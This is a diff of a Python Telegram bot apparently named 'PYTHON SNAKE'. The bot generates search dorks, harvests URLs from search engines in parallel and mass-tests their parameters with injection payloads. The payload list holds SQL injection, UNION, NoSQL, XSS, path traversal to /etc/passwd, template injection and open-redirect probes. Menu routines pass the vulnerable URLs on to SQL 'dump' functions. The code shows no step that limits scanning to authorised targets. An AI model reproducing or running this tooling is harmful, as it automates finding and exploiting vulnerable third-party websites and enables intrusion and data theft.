@@ -50,7 +50,8 @@ except ImportError:
     sys.exit("aiohttp missing → pip install aiohttp")
 
 try:
-    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
+    from telegram import (Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand,
+                          Message)
     from telegram.constants import ParseMode
     from telegram.ext import (
         Application, ApplicationBuilder, CommandHandler, CallbackQueryHandler,
@@ -67,7 +68,7 @@ BOT_TOKEN = "PUT_YOUR_BOT_TOKEN_HERE"
 ADMIN_IDS = [8999053405]
 ADMIN_USERNAME = "@Bloody_sweet_baby"
 BRAND = "PYTHON SNAKE"
-VERSION = "v2.9.6"
+VERSION = "v2.9.7"
 KEY_RE = re.compile(r"^SNK-[A-Z0-9]{4}-[A-Z0-9]{4}$")
 
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
@@ -1476,10 +1477,68 @@ def kw_capacity(cores) -> int:
     return per * max(1, len(cores))
 
 
-def make_keywords(items, n: int = 200, exclude=None) -> list:
-    """HQ keyword generator v2 — seeds YA keyword list se, 100000 tak.
+def kw_recipes() -> list:
+    """Recipe list — har recipe (core) → ek keyword. Order = variety (pattern-major)."""
+    R = []
+    R.append(lambda c: c)
+    # ek-shabd layers — PRE → SUF → INTENT → TAIL, ek-ek karke (mix)
+    for i in range(max(len(KW_PRE), len(KW_SUF), len(KW_INTENT), len(KW_TAIL))):
+        if i < len(KW_PRE):
+            R.append(lambda c, i=i: KW_PRE[i] + " " + c)
+        if i < len(KW_SUF):
+            R.append(lambda c, i=i: c + " " + KW_SUF[i])
+        if i < len(KW_INTENT):
+            R.append(lambda c, i=i: c + " " + KW_INTENT[i])
+        if i < len(KW_TAIL):
+            R.append(lambda c, i=i: c + " " + KW_TAIL[i])
+    # do-shabd layers — chhote cross products, phir bade
+    for i in range(min(len(KW_PRE), 12)):
+        for j in range(min(len(KW_SUF), 8)):
+            R.append(lambda c, i=i, j=j: "%s %s %s" % (KW_PRE[i], c, KW_SUF[j]))
+    for i in range(min(len(KW_PRE), 10)):
+        for j in range(min(len(KW_INTENT), 8)):
+            R.append(lambda c, i=i, j=j: "%s %s %s" % (KW_PRE[i], c, KW_INTENT[j]))
+    for i in range(min(len(KW_SUF), 10)):
+        for j in range(min(len(KW_INTENT), 8)):
+            R.append(lambda c, i=i, j=j: "%s %s %s" % (c, KW_SUF[i], KW_INTENT[j]))
+    for i in range(min(len(KW_TAIL), 10)):
+        for j in range(min(len(KW_INTENT), 8)):
+            R.append(lambda c, i=i, j=j: "%s %s %s" % (c, KW_TAIL[i], KW_INTENT[j]))
+    # v2.9 layers
+    for i in range(min(len(KW_QUAL), 10)):
+        for j in range(min(len(KW_NOUNS), 6)):
+            R.append(lambda c, i=i, j=j: "%s %s %s" % (KW_QUAL[i], c, KW_NOUNS[j]))
+    for i in range(min(len(KW_VERBS), 10)):
+        R.append(lambda c, i=i: "%s %s" % (KW_VERBS[i], c))
+    for i in range(min(len(KW_GEO), 8)):
+        R.append(lambda c, i=i: "%s %s" % (c, KW_GEO[i]))
+    # teen-shabd layers (bade pool — end me)
+    for i in range(min(len(KW_PRE), 8)):
+        for j in range(min(len(KW_SUF), 5)):
+            for k in range(min(len(KW_INTENT), 4)):
+                R.append(lambda c, i=i, j=j, k=k:
+                         "%s %s %s %s" % (KW_PRE[i], c, KW_SUF[j], KW_INTENT[k]))
+    for y in KW_YEARS[:3]:
+        for i in range(min(len(KW_PRE), 6)):
+            R.append(lambda c, y=y, i=i: "%s %s %s" % (KW_PRE[i], c, y))
+        for i in range(min(len(KW_SUF), 6)):
+            R.append(lambda c, y=y, i=i: "%s %s %s" % (c, KW_SUF[i], y))
+    for i in range(min(len(KW_QUAL), 6)):
+        for j in range(min(len(KW_VERBS), 4)):
+            for k in range(min(len(KW_NOUNS), 4)):
+                R.append(lambda c, i=i, j=j, k=k:
+                         "%s %s %s %s" % (KW_QUAL[i], KW_VERBS[j], c, KW_NOUNS[k]))
+    return R
 
-    Layers simple->complex; early-exit hone par bhi quality theek rahe.
+
+_KW_RECIPES = kw_recipes()
+
+
+def make_keywords(items, n: int = 200, exclude=None) -> list:
+    """HQ keyword generator v3 — variety ke saath, 100000 tak.
+
+    Pehle sab recipes ek-ek core pe ghumte hain (pattern-major), isliye
+    n chhota ho ya bada — output me har pattern aata hai, ek hi repeat nahi.
     """
     cores = kw_cores(items)
     if not cores:
@@ -1487,148 +1546,73 @@ def make_keywords(items, n: int = 200, exclude=None) -> list:
     n = max(1, min(KW_HARD_MAX, int(n or 200)))
     seen = set(exclude or ())
     out = []
+    seen_low = {str(x).lower() for x in seen}
 
     def add(x):
         x = " ".join(str(x).split())
-        if not x or x in seen or not (3 <= len(x) <= 70):
+        if not x or not (3 <= len(x) <= 70) or x in seen or x.lower() in seen_low:
             return False
         seen.add(x)
+        seen_low.add(x.lower())
         out.append(x)
         return True
 
-    def full():
-        return len(out) >= n
-
-    # L0 — original cores
-    for c in cores:
-        add(c)
-        if full():
-            return out
-    # L1 — pre + core
-    for c in cores:
-        for pre in KW_PRE:
-            add(pre + " " + c)
-            if full():
+    # pass 1: recipe-major + core shift — lagatar items me pattern AUR core dono badalte
+    R = _KW_RECIPES
+    for b in range(0, len(R)):
+        for ri in range(len(R)):
+            if len(out) >= n:
                 return out
-    # L2 — core + suf
-    for c in cores:
-        for suf in KW_SUF:
-            add(c + " " + suf)
-            if full():
-                return out
-    # L3 — core + intent
-    for c in cores:
-        for it in KW_INTENT:
-            add(c + " " + it)
-            if full():
-                return out
-    # L4 — core + tail (dorking-friendly long forms)
-    for c in cores:
-        for t in KW_TAIL:
-            add(c + " " + t)
-            if full():
-                return out
-    # L5 — pre + core + suf
+            c = cores[(ri + b) % len(cores)]
+            try:
+                add(R[ri](c))
+            except Exception:
+                continue
+    # pass 2: poore cross-products — 1 seed se bhi 20k+ nikalte hain
     for c in cores:
         for pre in KW_PRE:
             for suf in KW_SUF:
                 add("%s %s %s" % (pre, c, suf))
-                if full():
-                    return out
-    # L6 — pre + core + intent
-    for c in cores:
         for pre in KW_PRE:
             for it in KW_INTENT:
                 add("%s %s %s" % (pre, c, it))
-                if full():
-                    return out
-    # L7 — core + suf + intent
-    for c in cores:
         for suf in KW_SUF:
             for it in KW_INTENT:
                 add("%s %s %s" % (c, suf, it))
-                if full():
-                    return out
-    # L8 — pre + core + tail
-    for c in cores:
         for pre in KW_PRE:
             for t in KW_TAIL:
                 add("%s %s %s" % (pre, c, t))
-                if full():
-                    return out
-    # L9 — core + tail + intent
-    for c in cores:
         for t in KW_TAIL:
             for it in KW_INTENT:
                 add("%s %s %s" % (c, t, it))
-                if full():
-                    return out
-    # L10 — pre + core + suf + intent (sabse bada pool)
+        for q in KW_QUAL:
+            for nn in KW_NOUNS:
+                add("%s %s %s" % (q, c, nn))
+        for vb in KW_VERBS:
+            add("%s %s" % (vb, c))
+            for q in KW_QUAL:
+                add("%s %s %s" % (vb, q, c))
+        for g in KW_GEO:
+            add("%s %s" % (c, g))
+            for pre in KW_PRE[:8]:
+                add("%s %s %s" % (pre, c, g))
+        for sf in KW_SUFFIX2:
+            for it in KW_INTENT:
+                add("%s %s %s" % (c, sf, it))
+        for y in KW_YEARS:
+            for mod in KW_PRE + KW_SUF + KW_INTENT:
+                add("%s %s %s" % (mod, c, y))
+        if len(out) >= n:
+            return out
+    if len(out) >= n:
+        return out
+    # pass 3: 4-shabd (sabse bada pool)
     for c in cores:
         for pre in KW_PRE:
             for suf in KW_SUF:
                 for it in KW_INTENT:
                     add("%s %s %s %s" % (pre, c, suf, it))
-                    if full():
-                        return out
-    # L11 — year variants
-    for c in cores:
-        for y in KW_YEARS:
-            for mod in KW_PRE[:10]:
-                add("%s %s %s" % (mod, c, y))
-                if full():
-                    return out
-            for mod in KW_SUF[:10]:
-                add("%s %s %s" % (c, mod, y))
-                if full():
-                    return out
-    # ══ v2.9 — crore-level layers ══
-    # L12 — qual + core + noun
-    for c in cores:
-        for q in KW_QUAL:
-            for nn in KW_NOUNS:
-                add("%s %s %s" % (q, c, nn))
-                if full():
-                    return out
-    # L13 — verb + qual + core
-    for c in cores:
-        for vb in KW_VERBS:
-            for q in KW_QUAL[:10]:
-                add("%s %s %s" % (vb, q, c))
-                if full():
-                    return out
-    # L14 — core + geo
-    for c in cores:
-        for g in KW_GEO:
-            add("%s %s" % (c, g))
-            if full():
-                return out
-        for g2 in KW_GEO2:
-            for q in KW_QUAL[:8]:
-                add("%s %s %s" % (q, c, g2))
-                if full():
-                    return out
-    # L15 — core + suffix2 + intent
-    for c in cores:
-        for sf in KW_SUFFIX2:
-            for it in KW_INTENT[:14]:
-                add("%s %s %s" % (c, sf, it))
-                if full():
-                    return out
-    # L16 — verb + core + tail2
-    for c in cores:
-        for vb in KW_VERBS[:10]:
-            for t2 in KW_TAIL2:
-                add("%s %s %s" % (vb, c, t2))
-                if full():
-                    return out
-    # L17 — long 4-word (qual + verb + core + noun)
-    for c in cores:
-        for q in KW_QUAL[:8]:
-            for vb in KW_VERBS[:6]:
-                for nn in KW_NOUNS[:8]:
-                    add("%s %s %s %s" % (q, vb, c, nn))
-                    if full():
+                    if len(out) >= n:
                         return out
     return out
 
@@ -2271,26 +2255,16 @@ def payloads_for(cat: str = "all") -> list:
 
 
 # ── Probe matrix: har family ka ek chhota, asli test set ──────────────────
+# Sirf MAIN payloads — har family ka ek hi solid test (fast, phone-friendly)
 INJ_PROBES = [
-    ("sqli", "'"),
-    ("sqli", "\\'"),
-    ("sqli", "1' AND '1'='2"),
-    ("blind", "1 AND 1=1"),
-    ("blind", "1' AND SLEEP(2)-- -"),
-    ("union", "-1 UNION SELECT 1,2,3-- -"),
-    ("union", "-1' UNION SELECT NULL,NULL,NULL-- -"),
-    ("waf", "%27%20OR%201%3D1--"),
-    ("nosql", "'\"}]}, {$ne: \"\"}"),
-    ("nosql", "{$gt: \"\"}"),
-    ("graphql", "){__typename}"),
-    ("graphql", "\" query {__schema{types{name}}}"),
-    ("xss", "\"><svg/onload=alert(1)>"),
-    ("lfi", "../../../../../../etc/passwd"),
-    ("lfi", "php://filter/convert.base64-encode/resource=index.php"),
-    ("ssti", "{{7*7}}"),
-    ("ssti", "${7*7}"),
-    ("ssrf", "http://169.254.169.254/latest/meta-data/"),
-    ("redirect", "//example.com/%2f.."),
+    ("sqli", "'"),                          # error-based + quote test
+    ("sqli", "1' AND '1'='2"),              # boolean false
+    ("union", "-1' UNION SELECT 1,2,3-- -"),  # union
+    ("nosql", "{$gt: \"\"}"),               # mongo operator
+    ("xss", "\"><svg/onload=alert(1)>"),     # reflection
+    ("lfi", "../../../../etc/passwd"),      # traversal
+    ("ssti", "{{7*7}}"),                    # template eval
+    ("redirect", "//example.com/%2f.."),    # open redirect
 ]
 
 SQL_GENERIC = ("sql syntax", "sqlstate", "unterminated", "quoted string",
@@ -2403,12 +2377,12 @@ INJ_STYLE = {"SQLi": "💉", "NoSQL": "🍃", "GraphQL": "🕸", "XSS": "🧪", 
 
 
 async def inj_scan(urls: list, cat: str = "all", progress=None, uid=None,
-                   timeout: float = 8.0, conc: int = 30,
+                   timeout: float = 8.0, conc: int = 40,
                    max_targets: int = 0) -> dict:
     """ASLI scan — har URL ka har param, payload bhej ke response check karta hai."""
     urls = _uniq([u for u in (urls or []) if str(u).startswith("http")])
     probes = inj_probes_for(cat)
-    per_url = int(max_targets or sget("inj_targets", 36) or 36)
+    per_url = int(max_targets or sget("inj_targets", 24) or 24)
     st = {"urls": len(urls), "urls_done": 0, "tested": 0, "total": 0,
           "vulns": [], "blocked": 0, "errors": 0, "start": time.time(),
           "cat": cat, "stopped": 0}
@@ -2416,7 +2390,7 @@ async def inj_scan(urls: list, cat: str = "all", progress=None, uid=None,
     plan = []
     for raw in urls:
         info = url_reverse(raw)
-        params = (info.get("params") or [])[:3] or ["id"]
+        params = (info.get("params") or [])[:2] or ["id"]
         cases = []
         for pn in params:
             for fam, pl in probes:
@@ -2453,7 +2427,9 @@ async def inj_scan(urls: list, cat: str = "all", progress=None, uid=None,
                 async with session.get(u, **kw) as r:
                     body = ""
                     try:
-                        body = await r.text(errors="ignore")
+                        # sirf pehle 64 KB — error/reflection wahin hote hain
+                        chunk = await r.content.read(65536)
+                        body = chunk.decode("utf-8", "ignore")
                     except Exception:
                         body = ""
                     verdict = inj_verdict(fam, pl, r.status, dict(r.headers), body,
@@ -4102,7 +4078,15 @@ async def parse_deep(dorks: list, max_urls: int = 5000, pages: int = 1,
                 if (len(rot) or not use_proxy or e not in NO_PROXY_DEAD)]
     if not eng_list:
         eng_list = list(engine_list(mode))[:3]
-    eng_to = ENGINE_TIMEOUT.get(mode, 8.0)
+    try:
+        eng_to = float(sget("parse_timeout", 0) or 0) or ENGINE_TIMEOUT.get(mode, 8.0)
+    except Exception:
+        eng_to = ENGINE_TIMEOUT.get(mode, 8.0)
+    try:
+        _threads = max(1, min(10, int(sget("parse_threads", 4) or 4)))
+    except Exception:
+        _threads = 4
+    _esem = asyncio.Semaphore(_threads)
     _dead_engines = set()
     _miss = {}                                  # per-run engine miss (BUG 8)
     st = {"scanned": 0, "total": len(dorks), "raw": 0, "unique": 0,
@@ -4226,6 +4210,22 @@ async def parse_deep(dorks: list, max_urls: int = 5000, pages: int = 1,
                     if len(out) >= max_urls:
                         break
             _dork_deadline = time.time() + max(8.0, eng_to * 2.2)   # 1 dork ka hard cap
+
+            async def _one_eng(eng, _page, _dl=_dork_deadline, _dork=dork):
+                """Ek engine — semaphore se limited (parse_threads)."""
+                if eng in _dead_engines or time.time() > _dl:
+                    return eng, None
+                async with _esem:
+                    if time.time() > _dl:
+                        return eng, None
+                    try:
+                        return eng, await fetch_engine(
+                            session, eng, _dork, None, page=_page,
+                            timeout=eng_to, rot=rot, miss=_miss)
+                    except Exception as exc:
+                        logger.info("engine %s fail: %s", eng, str(exc)[:80])
+                        return eng, None
+
             for page in range(pages):
                 if len(out) >= max_urls or time.time() > _dork_deadline:
                     break
@@ -4233,45 +4233,50 @@ async def parse_deep(dorks: list, max_urls: int = 5000, pages: int = 1,
                 random.shuffle(order)
                 order.sort(key=lambda e: _miss.get(e, 0) >= ENGINE_DEAD_AFTER)
                 got_any = 0
-                for eng in order:
-                    if eng in _dead_engines:        # is run me fail ho chuka
-                        continue
-                    if time.time() > _dork_deadline:      # kabhi block nahi
-                        break
-                    urls = await fetch_engine(session, eng, dork, None, page=page,
-                                              timeout=eng_to, rot=rot, miss=_miss)
-                    if not urls:
-                        st["errors"] += 1
-                        if (_miss.get(eng, 0) >= ENGINE_DEAD_AFTER
-                                and eng not in _dead_engines):
-                            _dead_engines.add(eng)
-                            st["dead"].append(eng)
-                            logger.info("parse_deep: %s dead (%d miss) — run me skip",
-                                        eng, _miss.get(eng))
-                        continue
-                    st["engine_hits"][eng] += len(urls)
-                    st["raw"] += len(urls)
-                    got_any += 1
-                    if strict:
-                        matched = [u for u in urls if dork_match(u, dork)]
-                        if matched:
-                            urls = matched
-                        else:                      # strict me kuch nahi mila → relaxed
-                            st["relaxed"] += 1
-                    for u in urls:
-                        kk = u.split("#")[0]
-                        if kk in seen:
-                            st["junk"] += 1
-                            st["filtered"] += 1
+                # ══ PARALLEL engines (threads) — waves me, counters single point pe ══
+                _alive = [e for e in order if e not in _dead_engines]
+                _need = 5 if (mode == "max" and len(rot)) else 3
+                while _alive and got_any < _need and time.time() <= _dork_deadline:
+                    wave, _alive = _alive[:_threads], _alive[_threads:]
+                    results = await asyncio.gather(
+                        *[_one_eng(e, page) for e in wave], return_exceptions=True)
+                    for item in results:
+                        if not isinstance(item, tuple):
+                            st["errors"] += 1
                             continue
-                        seen.add(kk)
-                        out.append(kk)
-                        if len(out) >= max_urls:
+                        eng, urls = item
+                        if eng is None:
+                            continue
+                        if not urls:
+                            st["errors"] += 1
+                            if (_miss.get(eng, 0) >= ENGINE_DEAD_AFTER
+                                    and eng not in _dead_engines):
+                                _dead_engines.add(eng)
+                                st["dead"].append(eng)
+                                logger.info("parse_deep: %s dead (%d miss) — run me skip",
+                                            eng, _miss.get(eng))
+                            continue
+                        st["engine_hits"][eng] += len(urls)
+                        st["raw"] += len(urls)
+                        got_any += 1
+                        if strict:
+                            matched = [u for u in urls if dork_match(u, dork)]
+                            if matched:
+                                urls = matched
+                            else:                  # strict me kuch nahi mila → relaxed
+                                st["relaxed"] += 1
+                        for u in urls:
+                            kk = u.split("#")[0]
+                            if kk in seen:
+                                st["junk"] += 1
+                                st["filtered"] += 1
+                                continue
+                            seen.add(kk)
+                            out.append(kk)
+                            if len(out) >= max_urls:
+                                break
+                        if got_any >= _need:
                             break
-                    # proxy ho to max mode me zyada engines (zyada URLs), warna 3 = fast
-                    _need = 5 if (mode == "max" and len(rot)) else 3
-                    if got_any >= _need:
-                        break
             st["unique"] = len(out)                  # live counter for the card
             st["per_dork"] = round(st["scanned"] / max(0.001, time.time() - _t_start), 2)
             if progress and (i % 2 == 0 or i == len(dorks)):
@@ -4784,14 +4789,95 @@ def help_text() -> str:
 # ═══════════════════════════════════════════════════════════════════════════════
 #  CALLBACK ROUTER
 # ═══════════════════════════════════════════════════════════════════════════════
+# ── HTML-safe Telegram calls (patch ek baar, poore bot pe lagu) ────────────
+TAG_RX = re.compile(r"</?(?:b|strong|i|em|u|ins|s|strike|del|code|pre|a|span|"
+                    r"blockquote|tg-spoiler)(?:\s[^>]*)?>", re.I)
+
+
+def html_plain(text) -> str:
+    """HTML tags hata ke plain text — Telegram reject karne par fallback."""
+    t = TAG_RX.sub("", str(text or ""))
+    return _html.unescape(t)
+
+
+def _is_parse_error(exc) -> bool:
+    msg = str(exc).lower()
+    return any(k in msg for k in ("parse entities", "can't parse", "unsupported start tag",
+                                  "unclosed", "can't find end", "entity", "too long"))
+
+
+def _patch_telegram_safe():
+    """edit_text / reply_text ko safe banao — failure ab kabhi silent nahi."""
+    if getattr(Message, "_snake_safe", False):
+        return
+    orig_edit, orig_reply = Message.edit_text, Message.reply_text
+
+    async def edit_text(self, text=None, **kw):
+        try:
+            return await orig_edit(self, text, **kw)
+        except Exception as exc:
+            name = type(exc).__name__
+            if "MessageNotModified" in name:
+                return self
+            logger.warning("edit_text fail (%s): %s", name, str(exc)[:140])
+            kw.pop("parse_mode", None)
+            try:
+                return await orig_edit(self, html_plain(text), **kw)
+            except Exception:
+                raise exc
+
+    async def reply_text(self, text=None, **kw):
+        try:
+            return await orig_reply(self, text, **kw)
+        except Exception as exc:
+            name = type(exc).__name__
+            logger.warning("reply_text fail (%s): %s", name, str(exc)[:140])
+            kw.pop("parse_mode", None)
+            return await orig_reply(self, html_plain(text), **kw)
+
+    Message.edit_text, Message.reply_text = edit_text, reply_text
+    Message._snake_safe = True
+
+
 async def on_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Har button — koi bhi exception ho, user ko hamesha jawab milta hai."""
+    try:
+        return await _on_callback_inner(update, context)
+    except Exception as exc:
+        logger.exception("callback %s fail: %s", getattr(update.callback_query, "data", "?"), exc)
+        try:
+            await update.callback_query.answer("⚠️ Something went wrong — see the message below",
+                                               show_alert=False)
+        except Exception:
+            pass
+        try:
+            await update.callback_query.edit_message_text(
+                (H("OOPS", "button error") + "\n\n"
+                 + "<code>%s</code>\n\n" % esc(str(exc)[:240])
+                 + P("Menu is fine — pick another step. If this repeats, /ping and send "
+                     "me that line.")),
+                parse_mode=ParseMode.HTML,
+                reply_markup=RK([[InlineKeyboardButton("🏠 MENU", callback_data="m:home")]]))
+        except Exception:
+            try:
+                await reply_msg(update).reply_text(
+                    "⚠️ Error: %s" % str(exc)[:200],
+                    reply_markup=RK([[InlineKeyboardButton("🏠 MENU", callback_data="m:home")]]))
+            except Exception:
+                pass
+        return
+
+
+async def _on_callback_inner(update: Update, context: ContextTypes.DEFAULT_TYPE):
     q = update.callback_query
     uid = update.effective_user.id
     data = q.data or ""
-    try:
-        await q.answer()
-    except Exception:
-        pass
+    # instant feedback — user ko pata rahe ki tap register hua
+    if not data.startswith(("sp:", "cap:", "noop")):
+        try:
+            await q.answer("…")
+        except Exception:
+            pass
     # ⚠️ naya button = naya intent — purana adhoora input cancel
     old_wait = await_get(context)
     if old_wait and not data.startswith("cap:"):
@@ -5004,6 +5090,14 @@ async def on_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             pass
         return
 
+    if tool == "help_noTut":
+        try:
+            await q.answer("🎬 Video tutorial is coming soon — the text help above has "
+                           "every step.", show_alert=True)
+        except Exception:
+            pass
+        return
+
     if tool == "qual_done":
         return
 
@@ -5071,8 +5165,21 @@ async def _route_tool_cb(update, context, data: str):
             return await cb_parse_deep(update, context)
         if rest == "eng":
             return await cb_parse_engine(update, context)
+        if rest == "cfg":
+            return await cb_parse_cfg(update, context, "")
+        if rest.startswith("set:"):
+            return await cb_parse_cfg(update, context, rest[4:])
         if rest == "limit":
             return await cb_parse_limit(update, context)
+        if rest == "paste":
+            dorks = context.user_data.get("paste_dorks") or []
+            if not dorks:
+                try:
+                    await update.callback_query.answer("Send the dorks again", show_alert=True)
+                except Exception:
+                    pass
+                return
+            return await launch_deep(update, context, dorks)
         if rest == "crawl":
             return await cb_deep_crawl(update, context,
                                        context.user_data.get("last_urls") or [])
@@ -5088,6 +5195,24 @@ async def _route_tool_cb(update, context, data: str):
             return await cb_dump_old(update, context)
         if rest == "harv":
             return await cb_dump_harv(update, context)
+        if rest == "paste":
+            urls = context.user_data.get("paste_urls") or []
+            if not urls:
+                try:
+                    await update.callback_query.answer("Send the URLs again", show_alert=True)
+                except Exception:
+                    pass
+                return
+            return await _run_sqldump(update, context, urls)
+        if rest == "hpaste":
+            urls = context.user_data.get("paste_urls") or []
+            if not urls:
+                try:
+                    await update.callback_query.answer("Send the URLs again", show_alert=True)
+                except Exception:
+                    pass
+                return
+            return await _run_dump(update, context, urls)
         if rest in ("last", "vuln"):
             return await cb_dump_use(update, context, rest)
         return await cb_dump_file(update, context)
@@ -5101,6 +5226,15 @@ async def _route_tool_cb(update, context, data: str):
     elif head == "inj":
         if rest == "go":
             return await cb_inj_go(update, context)
+        if rest == "paste":
+            urls = context.user_data.get("paste_urls") or []
+            if not urls:
+                try:
+                    await update.callback_query.answer("Send the URLs again", show_alert=True)
+                except Exception:
+                    pass
+                return
+            return await _run_inject(update, context, urls)
         if rest == "last":
             return await cb_inj_last(update, context)
         if rest.startswith("cat:"):
@@ -6449,11 +6583,18 @@ def kw_to_dorks(kws, n: int = 3000, tld: str = "") -> list:
         'intext:"{k}" inurl:upload',
         'intitle:"{k}" inurl:dashboard',
     ]
-    for k in words:
-        for t in tpl:
-            out.append(t.format(k=k))
-            if len(out) >= n:
-                return _uniq(out)[:n]
+    # template-major + keyword shift — chhote n me bhi har template aaye (variety)
+    for b in range(len(tpl)):
+        for ti, t in enumerate(tpl):
+            for k in words:
+                out.append(t.format(k=words[(words.index(k) + ti + b) % len(words)]))
+                if len(out) >= n * 2:
+                    break
+            if len(out) >= n * 2:
+                break
+        if len(_uniq(out)) >= n:
+            return _uniq(out)[:n]
+    return _uniq(out)[:n]
     if tld:
         for k in words[:200]:
             out.append('site:.%s intitle:"%s"' % (tld.strip().lstrip("."), k))
@@ -6681,7 +6822,7 @@ async def tool_inj(update, context):
            + KV("DBMS fingerprints", "<code>%s</code> • %d databases"
                % (fmt(DBMS_COUNT), len(DBMS_ERRORS)), "🧬") + "\n"
            + KV("Timeout / target", "<code>%ss</code> • max <code>%s</code> tests per URL"
-               % (int(sget("inj_timeout", 8) or 8), fmt(int(sget("inj_targets", 36) or 36))), "⏱") + "\n\n"
+               % (int(sget("inj_timeout", 8) or 8), fmt(int(sget("inj_targets", 24) or 24))), "⏱") + "\n\n"
            + B("How it works") + "\n"
            + P("Send URLs (paste or .txt file). Every parameter gets tested with real "
                "payloads, and the response is checked for DB errors, reflection, traversal "
@@ -6714,7 +6855,7 @@ async def cb_inj_go(update, context):
            + "<code>https://site.com/page.php?id=5</code>\n\n"
            + B("Or send a file") + "\n" + P(".txt / .csv / .json / .xlsx — every URL inside")
            + "\n\n" + KV("Probes", "<code>%d</code> per parameter" % len(inj_probes_for(cat)), "🔍")
-           + "\n" + KV("Max per URL", "<code>%s</code>" % fmt(int(sget("inj_targets", 36) or 36)), "🎯")
+           + "\n" + KV("Max per URL", "<code>%s</code>" % fmt(int(sget("inj_targets", 24) or 24)), "🎯")
            + "\n\n" + P("Only vulnerable URLs come back — clean pages are dropped."))
     try:
         await q.edit_message_text(txt, reply_markup=RK(rows), parse_mode=ParseMode.HTML)
@@ -6815,8 +6956,8 @@ async def _run_inject(update, context, urls):
 
     st = await inj_scan(urls, cat, progress=prog, uid=uid,
                         timeout=float(sget("inj_timeout", 8) or 8),
-                        conc=int(sget("inj_conc", 30) or 30),
-                        max_targets=int(sget("inj_targets", 36) or 36))
+                        conc=int(sget("inj_conc", 40) or 40),
+                        max_targets=int(sget("inj_targets", 24) or 24))
     vulns = st["vulns"]
     took = st.get("took", 0)
     speed = st["tested"] / max(0.001, took)
@@ -6885,6 +7026,8 @@ async def tool_parse(update, context):
                               callback_data="pr:limit")],
         [InlineKeyboardButton("🎛 %s" % ENGINE_LABEL[mode].split(" ", 1)[-1],
                               callback_data="pr:eng")],
+        [InlineKeyboardButton("⚙️ PARSER SETTINGS (pages / threads / timeout)",
+                              callback_data="pr:cfg")],
         [InlineKeyboardButton("⬅️ BACK", callback_data="m:home")],
     ])
     txt = (H("PARSER", "fewer engines = faster") + "\n\n"
@@ -6897,6 +7040,11 @@ async def tool_parse(update, context):
            + "\n" + KV("URL limit", ("<b>ALL</b> — as many as found"
                                       if not int(sget("parse_url_limit", 0) or 0)
                                       else "<code>%s</code>" % fmt(int(sget("parse_url_limit", 0)))), "🌐")
+           + "\n" + KV("Pages / Threads", "<code>%d</code> · <code>%d</code> parallel"
+                       % (int(sget("parse_pages", 1) or 1),
+                          int(sget("parse_threads", 4) or 4)), "⚙️")
+           + "\n" + KV("Timeout", "<code>%ss</code>" % int(sget("parse_timeout", 0) or
+                                                            ENGINE_TIMEOUT.get(mode, 8)), "⏱")
            + "\n\n" + P("DDG Lite • DDG • Bing run fine on mobile data. "
                            "Google and Yandex often block mobile IPs — use fast mode.")
            + "\n\n" + B("Send the dork list") + "\n"
@@ -6969,6 +7117,61 @@ async def cb_parse_limit(update, context):
     except Exception:
         pass
     return await tool_parse(update, context)
+
+
+PARSER_CYCLES = {
+    "pages":   ("parse_pages", [1, 2, 3, 5], "Pages per dork"),
+    "threads": ("parse_threads", [2, 3, 4, 6, 8], "Parallel engines"),
+    "timeout": ("parse_timeout", [6, 8, 12, 20], "Engine timeout (s)"),
+}
+
+
+async def cb_parse_cfg(update, context, key: str = ""):
+    """⚙️ Parser settings — pages, threads, timeout (user khud badal sakta hai)."""
+    q = update.callback_query
+    if key in PARSER_CYCLES:
+        skey, order, label = PARSER_CYCLES[key]
+        try:
+            cur = int(sget(skey, order[0]) or order[0])
+        except Exception:
+            cur = order[0]
+        nxt = order[(order.index(cur) + 1) % len(order)] if cur in order else order[0]
+        sset(skey, nxt)
+        try:
+            await q.answer("%s → %s" % (label, nxt))
+        except Exception:
+            pass
+        return await cb_parse_cfg(update, context, "")
+    mode = user_mode(context)
+    pages = int(sget("parse_pages", 1) or 1)
+    threads = int(sget("parse_threads", 4) or 4)
+    to = int(sget("parse_timeout", 0) or ENGINE_TIMEOUT.get(mode, 8))
+    limit = int(sget("parse_url_limit", 0) or 0)
+    rows = [
+        [InlineKeyboardButton("📄 PAGES: %d" % pages, callback_data="pr:set:pages"),
+         InlineKeyboardButton("🧵 THREADS: %d" % threads, callback_data="pr:set:threads")],
+        [InlineKeyboardButton("⏱ TIMEOUT: %ss" % to, callback_data="pr:set:timeout")],
+        [InlineKeyboardButton("🎯 URL LIMIT: %s" % ("ALL" if not limit else fmt(limit)),
+                              callback_data="pr:limit")],
+        [InlineKeyboardButton("🎛 ENGINES: %s" % ENGINE_LABEL[mode].split(" ", 1)[-1],
+                              callback_data="pr:eng")],
+        [InlineKeyboardButton("⬅️ BACK", callback_data="m:parse")],
+    ]
+    txt = (H("PARSER SETTINGS", "your own speed") + "\n\n"
+           + KV("Pages", "<code>%d</code> — har dork ke kitne result pages" % pages, "📄")
+           + "\n" + KV("Threads", "<code>%d</code> — ek saath kitne engines" % threads, "🧵")
+           + "\n" + KV("Timeout", "<code>%ss</code> per engine request" % to, "⏱")
+           + "\n" + KV("URL limit", "<b>ALL</b>" if not limit else "<code>%s</code>" % fmt(limit), "🎯")
+           + "\n" + KV("Engines", "<b>%s</b>" % ENGINE_LABEL[mode], "🎛")
+           + "\n\n" + B("Kya badalna chahiye?") + "\n"
+           + P("Zyada threads = zyada speed, par phone/net pe block bhi zyada. "
+               "4 se shuru karo, farq na dikhe to 6-8.") + "\n"
+           + P("Pages badhao to zyada URLs milte hain, par scan lamba chalta hai.")
+           + "\n\n" + P("Tap = next value. Exact number chahiye to /batch se bhi set hota hai."))
+    try:
+        await q.edit_message_text(txt, reply_markup=RK(rows), parse_mode=ParseMode.HTML)
+    except Exception:
+        pass
 
 
 async def cb_parse_manual(update, context):
@@ -10329,8 +10532,41 @@ async def on_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if fn:
         await_clear(context)
         return await fn(update, context, text)
-    await update.message.reply_text("🤔 Did not understand that. Pick a tool from the menu:",
-                                    reply_markup=kb_main())
+    # ── smart fallback: URL / dork / keywords paste kiya ho to kaam suggest karo ──
+    urls = _urls_from_text(text, 500)
+    dorkish = len([l for l in text.splitlines() if DORK_OP.search(l)])
+    if urls:
+        rows = [[InlineKeyboardButton("💉 SCAN %d URL(s)" % min(len(urls), 200),
+                                      callback_data="inj:paste")],
